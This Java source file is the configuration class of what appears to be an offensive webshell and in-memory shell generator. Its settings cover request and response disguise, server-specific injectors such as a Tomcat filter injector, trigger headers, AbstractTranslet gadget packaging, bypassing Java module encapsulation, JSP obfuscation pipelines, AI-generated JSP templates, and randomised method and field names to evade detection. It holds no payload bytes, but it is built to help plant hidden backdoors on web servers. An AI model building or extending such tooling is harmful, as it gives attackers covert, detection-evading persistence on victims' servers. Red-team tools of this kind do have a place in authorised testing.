package org.leo.jmg;


import org.leo.core.entity.Disguise;
import org.leo.core.util.request.ClassNameGenerator;

/**
 * Shell生成器配置类
 * 用于配置Shell生成器的各种参数
 * 
 * @author LeoSpring
 */
public class ShellGeneratorConfig {
    
    // 必需参数
    private Disguise reqDisguise;
    private Disguise respDisguise;
    
    // 可选参数
    private String coreClassName;
    private byte[] coreClassBytes;
    private int respCode = 200;
    // 传输协议（用于JSP Shell生成，可选：http, httpchunk，默认为http）
    private String protocol = "http";
    // 中间件类型（用于注入器，需要用户明确指定宿主机中间件类型）
    private String serverType;
    private String shellType;
    private String packerType;

    // 内存马相关配置
    private String headerName;
    private String headerValue;

    //
    private String shellClassName;
    private byte[] shellClassBytes;

    // 注入器相关配置
    private String injectorClassName;
    private byte[] injectorClassBytes;
    private String urlPattern = "/*";
    private boolean isAbstractTranslet = false;
    /** 部分 Packer（如 ScriptEngine）是否绕过 Java 模块封装 */
    private boolean byPassJavaModule = false;

    /**
     * 用户自定义 JSP/JSPX 混淆步骤 ID 列表（有序）。
     * 为 null 或空时 JSP Packer 使用默认 preset；非空时按此顺序构建 pipeline。
     */
    private java.util.List<String> jspObfuscationSteps;

    /**
     * AI 生成的自定义 JSP 模板（含 {{VAR:}} / {{CLS:}} / {{base64Str}} 占位符）。
     * 非 null 时 JSP Packer 优先使用此模板，替代内置模板文件。
     */
    private String customJspTemplate;

    // LeoCore 私有方法随机名（生成时自动赋值，外部无需关心）
    private String methodAction;
    private String methodTestConn;
    private String methodRedirect;
    private String methodLoadComponent;
    private String methodInvokeComponent;

    // LeoCore 实例/静态字段随机名
    private String fieldParams;
    private String fieldResults;
    private String fieldHostId;
    private String fieldComponents;

    public byte[] getCoreClassBytes() {
        return coreClassBytes;
    }

    public void setCoreClassBytes(byte[] coreClassBytes) {
        this.coreClassBytes = coreClassBytes;
    }

    public void setInjectorClassName(String injectorClassName) {
        this.injectorClassName = injectorClassName;
    }

    public byte[] getInjectorClassBytes() {
        return injectorClassBytes;
    }

    public void setInjectorClassBytes(byte[] injectorClassBytes) {
        this.injectorClassBytes = injectorClassBytes;
    }

    public void setShellClassName(String shellClassName) {
        this.shellClassName = shellClassName;
    }

    public byte[] getShellClassBytes() {
        return shellClassBytes;
    }

    public void setShellClassBytes(byte[] shellClassBytes) {
        this.shellClassBytes = shellClassBytes;
    }

    /**
     * 私有构造函数，使用Builder模式
     */
    private ShellGeneratorConfig() {
        java.util.Set<String> used = new java.util.HashSet<String>();
        this.methodAction          = ClassNameGenerator.randomMethodName(used);
        this.methodTestConn        = ClassNameGenerator.randomMethodName(used);
        this.methodRedirect        = ClassNameGenerator.randomMethodName(used);
        this.methodLoadComponent   = ClassNameGenerator.randomMethodName(used);
        this.methodInvokeComponent = ClassNameGenerator.randomMethodName(used);

        this.fieldParams     = ClassNameGenerator.randomFieldName(used);
        this.fieldResults    = ClassNameGenerator.randomFieldName(used);
        this.fieldHostId     = ClassNameGenerator.randomFieldName(used);
        this.fieldComponents = ClassNameGenerator.randomFieldName(used);
    }
    
    /**
     * 创建配置构建器
     *
     * @param reqDisguise  请求伪装器（必需）
     * @param respDisguise 响应伪装器（必需）
     * @return 配置构建器
     */
    public static Builder builder(Disguise reqDisguise, Disguise respDisguise) {
        return new Builder(reqDisguise, respDisguise);
    }

    public void setByPassJavaModule(boolean byPassJavaModule) {
        this.byPassJavaModule = byPassJavaModule;
    }



    /**
     * 配置构建器
     */
    public static class Builder {
        private ShellGeneratorConfig config;
        
        public Builder(Disguise reqDisguise, Disguise respDisguise) {
            config = new ShellGeneratorConfig();
            config.reqDisguise = reqDisguise;
            config.respDisguise = respDisguise;
        }
        
        /**
         * 设置核心类名
         */
        public Builder coreClassName(String coreClassName) {
            config.coreClassName = coreClassName;
            return this;
        }
        
        /**
         * 设置响应码
         */
        public Builder respCode(int respCode) {
            config.respCode = respCode;
            return this;
        }
        
        /**
         * 设置传输协议（用于JSP Shell生成）
         * 
         * @param protocol 传输协议类型（字符串：http, httpchunk），默认为http
         * @return Builder实例
         */
        public Builder protocol(String protocol) {
            if (protocol != null && !protocol.trim().isEmpty()) {
                String protocolLower = protocol.toLowerCase();
                if ("http".equals(protocolLower) || "httpchunk".equals(protocolLower)) {
                    config.protocol = protocolLower;
                } else {
                    throw new IllegalArgumentException("传输协议必须是 http 或 httpchunk，当前值: " + protocol);
                }
            }
            return this;
        }

        
        /**
         * 设置触发Header名称（用于内存马）
         */
        public Builder headerName(String headerName) {
            config.headerName = headerName;
            return this;
        }
        
        /**
         * 设置触发Header值（用于内存马）
         */
        public Builder headerValue(String headerValue) {
            config.headerValue = headerValue;
            return this;
        }
        
        /**
         * 设置Header信息（用于内存马）
         */
        public Builder header(String headerName, String headerValue) {
            config.headerName = headerName;
            config.headerValue = headerValue;
            return this;
        }
        
        /**
         * 设置注入器类名
         */
        public Builder injectorClassName(String injectorClassName) {
            config.injectorClassName = injectorClassName;
            return this;
        }
        
        /**
         * 设置Shell类名（用于注入器）
         */
        public Builder shellClassName(String shellClassName) {
            config.shellClassName = shellClassName;
            return this;
        }
        
        /**
         * 设置URL匹配模式（用于注入器）
         */
        public Builder urlPattern(String urlPattern) {
            config.urlPattern = urlPattern;
            return this;
        }
        
        /**
         * 设置是否继承AbstractTranslet（用于注入器）
         */
        public Builder abstractTranslet(boolean isAbstractTranslet) {
            config.isAbstractTranslet = isAbstractTranslet;
            return this;
        }

        /**
         * 目标应用服务器类型，如 Tomcat，须与 {@link ServerInjectorMapper} 注册表中的 key 一致
         */
        public Builder serverType(String serverType) {
            if (serverType == null || serverType.trim().isEmpty()) {
                throw new IllegalArgumentException("serverType 不能为空");
            }
            config.serverType = serverType.trim();
            return this;
        }

        /**
         * 注入器形态名称，如 FilterInjector，须为该 serverType 下支持的注入器名
         */
        public Builder shellType(String shellType) {
            if (shellType == null || shellType.trim().isEmpty()) {
                throw new IllegalArgumentException("shellType 不能为空");
            }
            config.shellType = shellType.trim();
            return this;
        }

        /**
         * 打包器类型，与 {@link org.leo.jmg.mem.packer.PackerRegistry} 中注册的名称一致（忽略大小写）
         */
        public Builder packerType(String packerType) {
            if (packerType == null || packerType.trim().isEmpty()) {
                throw new IllegalArgumentException("packerType 不能为空");
            }
            config.packerType = packerType.trim();
            return this;
        }

        public Builder byPassJavaModule(boolean byPassJavaModule) {
            config.byPassJavaModule = byPassJavaModule;
            return this;
        }

        public Builder jspObfuscationSteps(java.util.List<String> steps) {
            config.jspObfuscationSteps = steps;
            return this;
        }

        public Builder customJspTemplate(String template) {
            config.customJspTemplate = template;
            return this;
        }

        /**
         * 构建配置对象
         */
        public ShellGeneratorConfig build() {
            // 如果核心类名为空，自动生成
            if (config.coreClassName == null || config.coreClassName.trim().isEmpty()) {
                config.coreClassName = ClassNameGenerator.generateServletStyleClassName();
            }
            return config;
        }
    }
    
    // Getter方法
    
    public Disguise getReqDisguise() {
        return reqDisguise;
    }
    
    public Disguise getRespDisguise() {
        return respDisguise;
    }
    
    public String getCoreClassName() {
        return coreClassName;
    }
    
    public int getRespCode() {
        return respCode;
    }
    

    
    public String getHeaderName() {
        return headerName;
    }
    
    public String getHeaderValue() {
        return headerValue;
    }
    
    public String getInjectorClassName() {
        return injectorClassName;
    }
    
    public String getShellClassName() {
        return shellClassName;
    }
    
    public String getUrlPattern() {
        return urlPattern;
    }
    
    public boolean isAbstractTranslet() {
        return isAbstractTranslet;
    }

    public void setAbstractTranslet(boolean abstractTranslet) {
        isAbstractTranslet = abstractTranslet;
    }

    public String getServerType() {
        return serverType;
    }

    public String getShellType() {
        return shellType;
    }

    public String getPackerType() {
        return packerType;
    }

    public boolean isByPassJavaModule() {
        return byPassJavaModule;
    }

    public java.util.List<String> getJspObfuscationSteps() {
        return jspObfuscationSteps;
    }

    public String getCustomJspTemplate() {
        return customJspTemplate;
    }

    public void setCustomJspTemplate(String customJspTemplate) {
        this.customJspTemplate = customJspTemplate;
    }

    public String getProtocol() {
        return protocol;
    }

    public String getMethodAction() {
        return methodAction;
    }

    public String getMethodTestConn() {
        return methodTestConn;
    }

    public String getMethodRedirect() {
        return methodRedirect;
    }

    public String getMethodLoadComponent() {
        return methodLoadComponent;
    }

    public String getMethodInvokeComponent() {
        return methodInvokeComponent;
    }

    public String getFieldParams() {
        return fieldParams;
    }

    public String getFieldResults() {
        return fieldResults;
    }

    public String getFieldHostId() {
        return fieldHostId;
    }

    public String getFieldComponents() {
        return fieldComponents;
    }

    /**
     * 验证配置是否有效
     *
     * @throws IllegalArgumentException 如果配置无效
     */
    public void validate() {
        if (reqDisguise == null) {
            throw new IllegalArgumentException("reqDisguise不能为空");
        }
        if (respDisguise == null) {
            throw new IllegalArgumentException("respDisguise不能为空");
        }
    }

    /**
     * 生成内存马注入器前的校验
     */
    public void validateForInjector() {
        validate();
        if (serverType == null || serverType.trim().isEmpty()) {
            throw new IllegalArgumentException("生成注入器需要指定 serverType（目标应用服务器类型，如 Tomcat）");
        }
        if (shellType == null || shellType.trim().isEmpty()) {
            throw new IllegalArgumentException("生成注入器需要指定 shellType（注入器形态，如 FilterInjector）");
        }
        if (packerType == null || packerType.trim().isEmpty()) {
            throw new IllegalArgumentException("配置类中 packerType 不能为空");
        }
    }

}

